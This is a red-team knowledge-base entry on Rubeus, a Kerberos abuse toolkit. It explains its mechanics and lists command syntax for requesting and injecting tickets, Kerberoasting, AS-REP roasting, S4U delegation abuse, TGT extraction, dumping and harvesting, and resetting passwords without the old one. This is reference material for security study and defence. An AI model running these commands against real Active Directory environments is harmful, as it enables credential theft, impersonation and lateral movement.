---
title: Rubeus
aliases: [Rubeus.exe]
type: tool
domain: [active-directory, red-team, windows-internals]
tags: [type/tool, domain/red-team, domain/active-directory, proto/kerberos]
source: "[[Source - harmj0y blog]]"
source_url: https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/
verified: true
related: ["[[Kerberos]]", "[[Kerberos Authentication Flow]]", "[[Rubeus]]", "[[Kerberoasting]]", "[[AS-REP Roasting]]", "[[Overpass-the-Hash]]", "[[Pass-the-Ticket]]", "[[Constrained Delegation]]", "[[Unconstrained Delegation]]", "[[Kerberos Delegation]]"]
created: 2026-06-07
updated: 2026-06-07
---

> [!summary] Rubeus is a C# (.NET 3.5) toolkit for raw Kerberos abuse — requesting/renewing tickets, pass-the-ticket, overpass-the-hash, S4U constrained-delegation abuse, Kerberoasting, AS-REP roasting, ticket harvesting/monitoring, and Kerberos password resets — implemented as a partial port of Benjamin Delpy's Kekeo.

## What it does
Rubeus manipulates Kerberos at the traffic and host level without touching LSASS for the core ticket-request operations. It was written to re-implement Kekeo functionality in C# because Kekeo depended on a commercial ASN.1 library, integrated poorly with PE/PowerShell loaders, and shipped as easily-signatured binaries. Rubeus instead uses the open-source DDer ASN.1 library (Thomas Pornin, MIT-like license), so the source can be freely modified and recompiled.

Key properties:
- Most ticket-request actions (`asktgt`, `asktgs`, `s4u`, `kerberoast`, `asreproast`, `tgtdeleg`) need **no elevation** — they speak Kerberos over the wire.
- Elevation-requiring actions: `dump`, `monitor`, `harvest`, and any use of `/luid:` to target another logon session.
- Tickets are emitted as base64-encoded KRB-CRED `.kirbi` blobs. A `.kirbi` is usable because it carries the plaintext session key inside a KRB-CRED structure (a raw TGT is just an opaque blob encrypted to the [[krbtgt]] hash).
- Encryption types: RC4 (`/rc4:`), AES128 (`/aes128:`), AES256 (`/aes256:`).
- Only one TGT exists per logon session; use `/createnetonly` or `/luid:` to avoid clobbering your own session.

Decode an emitted ticket to a file:
```powershell
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64STRING>"))
```

## Key commands/functions

**asktgt** — request a TGT from a user hash (non-elevated alternative to Mimikatz over-pass-the-hash). See [[Overpass-the-Hash]].
```
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt
Rubeus.exe asktgt /user:<USER> /aes256:<AES_KEY> /createnetonly:C:\Windows\System32\cmd.exe
```

**asktgs** — request service ticket(s) using an existing TGT (`.kirbi` or base64). Supports comma-separated SPNs.
```
Rubeus.exe asktgs /ticket:<BASE64|FILE.KIRBI> /service:<SPN1>,<SPN2> [/dc:<DC>] [/ptt]
```

**ptt** — inject a ticket into a logon session (equivalent to `kerberos::ptt`). See [[Pass-the-Ticket]].
```
Rubeus.exe ptt /ticket:<BASE64|FILE.KIRBI> [/luid:<LOGONID>]
```

**renew** — restart a TGT's validity within its renewal window (default 7 days); `/autorenew` keeps it alive on remote hosts.
```
Rubeus.exe renew /ticket:<BASE64|FILE.KIRBI> /ptt
Rubeus.exe renew /ticket:<FILE.KIRBI> /autorenew
```

**s4u** — abuse [[Constrained Delegation]] from a compromised account: S4U2self + S4U2proxy to impersonate any user to a delegated SPN. `/altservice:X,Y,Z` substitutes unprotected service names in the KRB-CRED sname (e.g. turn an HTTP ticket into CIFS).
```
Rubeus.exe s4u /ticket:<FILE.KIRBI> /impersonateuser:<TARGET> /msdsspn:<SERVICE/SERVER> /altservice:<SVC> /ptt
Rubeus.exe s4u /user:<USER> /rc4:<HASH> /impersonateuser:<TARGET> /msdsspn:LDAP/<SERVER>
```

**tgtdeleg** — extract a usable TGT `.kirbi` for the *current* user with **no elevation**, via the GSS-API/SSPI delegation trick: `AcquireCredentialsHandle()` (SECPKG_CRED_OUTBOUND) + `InitializeSecurityContext()` with `ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH` against an [[Unconstrained Delegation]] target (default `HOST/<DC>`), pulling the forwarded TGT out of the AP-REQ Authenticator checksum. Resulting TGT can be `/autorenew`'d for up to 7 days. (Cannot be used with `changepw` — returns KRB5_KPASSWD_MALFORMED.)
```
Rubeus.exe tgtdeleg
```

**kerberoast** — request RC4 service tickets for SPN accounts and output Hashcat-ready hashes. See [[Kerberoasting]].
```
Rubeus.exe kerberoast /ou:"OU=TestingOU,DC=testlab,DC=local"
Rubeus.exe kerberoast /user:<USER> /spn:<SERVICE/HOST>
```

**asreproast** — request AS-REP for preauth-disabled users for offline cracking. See [[AS-REP Roasting]].
```
Rubeus.exe asreproast /user:<USERNAME> /domain:<DOMAIN>
```

**changepw** — RFC 3244 Kerberos password reset (Aorato/kpasswd, port 464). Sends AP-REQ + KRB-PRIV using the target's TGT; combined with `asktgt` + a hash, resets a password without knowing the old one.
```
Rubeus.exe changepw /ticket:<FILE.KIRBI> /new:<NEWPASSWORD> [/dc:<DC>]
```

**dump** — extract cached tickets from LSA. Elevated (`LsaRegisterLogonProcess()`) enumerates all sessions; non-elevated (`LsaConnectUntrusted()`) sees only the current user. On Win7+ TGT session keys are nulled unless `allowtgtsessionkey` is set; service-ticket session keys remain accessible non-elevated.
```
Rubeus.exe dump [/luid:<LOGONID>] [/service:krbtgt]
```

**monitor / harvest** — watch the Security log for 4624 logons, then extract and auto-renew TGTs to maintain a harvested ticket cache (elevated).
```
Rubeus.exe monitor /interval:<SEC> [/filteruser:<USER>]
Rubeus.exe harvest /interval:<SEC>
```

**createnetonly** — create a sacrificial `SECURITY_LOGON_TYPE 9` (runas /netonly-style) logon session to apply tickets without disturbing the current session.
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe"
```

**describe** — parse a ticket and print its enctype, flags, lifetimes, and session key.
```
Rubeus.exe describe /ticket:<BASE64|FILE.KIRBI>
```

## Used in techniques
- [[Overpass-the-Hash]], [[Pass-the-Ticket]] — `asktgt`, `ptt`, `createnetonly`
- [[Kerberoasting]], [[AS-REP Roasting]] — `kerberoast`, `asreproast`
- [[Constrained Delegation]] — `s4u` (with `/altservice` sname substitution)
- [[Unconstrained Delegation]] — `tgtdeleg` (GSS-API forwarded-TGT extraction)
- [[Kerberos Authentication Flow]] — `asktgt`/`asktgs`/`renew`/`describe`

## Sources
- harmj0y, "From Kekeo to Rubeus" — https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/
- harmj0y, "Rubeus – Now With More Kekeo" — https://blog.harmj0y.net/redteaming/rubeus-now-with-more-kekeo/
